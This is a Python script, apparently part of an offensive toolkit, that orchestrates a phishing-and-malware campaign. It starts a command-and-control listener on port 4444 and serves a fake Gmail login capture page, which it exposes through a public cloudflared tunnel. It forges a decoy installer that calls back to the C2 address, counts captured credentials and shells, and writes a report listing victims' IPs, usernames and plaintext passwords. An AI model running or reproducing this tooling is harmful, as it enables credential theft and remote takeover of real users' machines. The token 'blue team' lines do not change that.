#!/usr/bin/env python3
# language: Python 3, file: league.py, target: macOS
# LIGNE ROUGE — L'ORCHESTRATEUR · powered by Maxime Leal
# Une commande : planifie la campagne, lance les kits dans l'ordre, surveille, genere le rapport.
# Usage: python3 league.py plan <nom> [site]  |  run <nom> [duree_min]  |  report <nom>  |  status
import os, sys, json, time, subprocess, urllib.request, threading
sys.path.insert(0, os.path.expanduser('~/Desktop/tool_DC'))
import dc_fullscreen as dfs

DESK = os.path.expanduser("~/Desktop/tool_dc")
DESK = os.path.expanduser("~/Desktop/tool_DC")
KITS = os.path.join(DESK)
CAMP = os.path.join(KIT_DIR := os.path.join(KITS, "LeagueOfShadows", "campagnes"))

def camp_dir(name): return os.path.join(os.path.dirname(os.path.abspath(__file__)), "campagnes", name)

def kit_path(*p): return os.path.join(os.path.expanduser("~/Desktop/tool_DC"), *p)

def sh(cmd, log=None):
    print(f"    $ {cmd}")
    if log:
        f = open(log, "w"); subprocess.Popen(cmd, shell=True, stdout=f, stderr=f)
    else:
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def plan(name, site="gmail", c2="192.168.1.222"):
    d = camp_dir(name); os.makedirs(d, exist_ok=True)
    cfg = {"nom": name, "site": site, "c2": c2, "cree": time.strftime("%Y-%m-%d %H:%M"),
           "steps": [
               {"n": 1, "nom": "PHISHING", "desc": f"page de capture {site} (Scarecrow)"},
               {"n": 2, "nom": "DROPPER", "desc": "installateur Arkham forge + page web"},
               {"n": 3, "nom": "C2", "desc": "listener 4444 + console 5050 (Arkham)"},
               {"n": 4, "nom": "SURVEILLANCE", "desc": "monitoring des captures et sessions"},
           ]}
    json.dump(cfg, open(os.path.join(d, "campagne.json"), "w"), indent=1)
    print(f"[OK] campagne '{name}' planifiee -> {d}")
    print("     4 steps : PHISHING -> DROPPER -> C2 -> SURVEILLANCE")
    print("     lancement : python3 league.py run " + name)

def run(name, minutes=10):
    d = camp_dir(name)
    cfg_p = os.path.join(d, "campagne.json")
    if not os.path.exists(cfg_p): print("[X] campagne inconnue — plan d'abord"); return
    cfg = json.load(open(cfg_p))
    site, c2 = cfg["site"], cfg["c2"]
    print(f"[*] LIGNE ROUGE : campagne '{name}' engagee ({minutes} min)\n")

    print("[STEP 3] C2 en premier (les shells doivent avoir une maison)...")
    sh(f'python3 -u "{kit_path("ArkhamGame", "arkham_c2.py")}" 4444 5050 > /tmp/league_c2.log 2>&1')
    time.sleep(1.5)

    print("[STEP 1] PHISHING — page de capture + lien public...")
    sh(f'python3 -u "{kit_path("ScarecrowPhish", "sorties/trick", site, "serve.py")}" > /tmp/league_phish.log 2>&1')
    time.sleep(1)
    sh(f'cloudflared tunnel --url http://localhost:8085 --no-autoupdate > /tmp/league_tunnel.log 2>&1')
    time.sleep(8)

    print("[STEP 2] DROPPER — forge de l'installateur-leurre...")
    sh(f'cd "{kit_path("ArkhamGame")}" && python3 lex_forge.py {c2} 4444 > /tmp/league_forge.log 2>&1')

    pub = ""
    try:
        pub = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com",
                        open("/tmp/league_tunnel.log", errors="ignore").read()).group(0)
    except Exception: pass

    cfg["run"] = {"debut": time.strftime("%H:%M:%S"), "lien_phishing": pub + "/login", "c2_console": "http://127.0.0.1:5050"}
    json.dump(cfg, open(cfg_p, "w"), indent=1)
    print(f"\n  LIEN PIEGE : {pub}/login")
    print(f"  CONSOLE    : http://127.0.0.1:5050")
    print(f"  [surveillance {minutes} min — Ctrl+C pour couper avant]\n")

    phish_caps = os.path.join(kit_path("ScarecrowPhish", "sorties/trick", site, "captures.json"))
    t0 = time.time()
    try:
        while time.time() - t0 < minutes * 60:
            time.sleep(10)
            n_phish = 0
            try: n_phish = len(json.load(open(phish_caps)))
            except Exception: pass
            n_sess = "?"
            try:
                d2 = json.loads(urllib.request.urlopen("http://127.0.0.1:5050/sessions", timeout=5).read())
                n_sess = len(d2)
            except Exception: pass
            print(f"  [{time.strftime('%H:%M:%S')}] captures phishing: {n_phish} · sessions C2: {n_sess}")
    except KeyboardInterrupt:
        print("\n  surveillance coupee.")

def report(name):
    d = camp_dir(name)
    cfg_p = os.path.join(d, "campagne.json")
    if not os.path.exists(cfg_p): print("[X] campagne inconnue"); return
    cfg = json.load(open(cfg_p))
    site = cfg.get("site", "gmail")
    lines = [f"# RAPPORT DE CAMPAGNE — {name}", f"*genere {time.strftime('%Y-%m-%d %H:%M')} · powered by Maxime Leal*", ""]
    lines.append(f"## Parametres\n- site leurre : **{site}** · C2 : **{cfg.get('c2')}**")
    lines.append(f"- lien phishing : {cfg.get('run', {}).get('lien_phishing', 'n/a')}")
    lines.append(f"- console C2 : {cfg.get('run', {}).get('c2_console', 'n/a')}\n")
    lines.append("## Captures phishing")
    caps_p = kit_path("ScarecrowPhish", "sorties/trick", site, "captures.json")
    try:
        caps = json.load(open(caps_p))
        for e in caps:
            lines.append(f"- `{e['heure']}` IP **{e['ip']}** — `{e['identifiant']}` / `{e['mot_de_passe']}`")
    except Exception:
        lines.append("- aucune")
    lines.append("\n## Sessions C2")
    try:
        d2 = json.loads(urllib.request.urlopen("http://127.0.0.1:5050/sessions", timeout=5).read())
        for sid, s in d2.items(): lines.append(f"- {sid} — {s['ip']} — {s['time']}")
    except Exception:
        lines.append("- console C2 inactive")
    lines.append("\n## Recommandations blue team\n- verifier Run keys + taches planifiees sur les cibles")
    lines.append("- regles Sigma generees par KryptoniteSuite")
    out = os.path.join(d, "RAPPORT.md")
    open(out, "w").write("\n".join(lines))
    print(f"[OK] rapport -> {out}")
    os.system(f"open '{out}'")

if __name__ == "__main__":
    import re
    if len(sys.argv) < 3:
        print("usage: league.py plan <nom> [site] | run <nom> [min] | report <nom>"); sys.exit(0)
    cmd, name = sys.argv[1], sys.argv[2]
    if cmd == "plan": plan(name, sys.argv[3] if len(sys.argv) > 3 else "gmail")
    elif cmd == "run": run(name, int(sys.argv[3]) if len(sys.argv) > 3 else 10)
    elif cmd == "report": report(name)
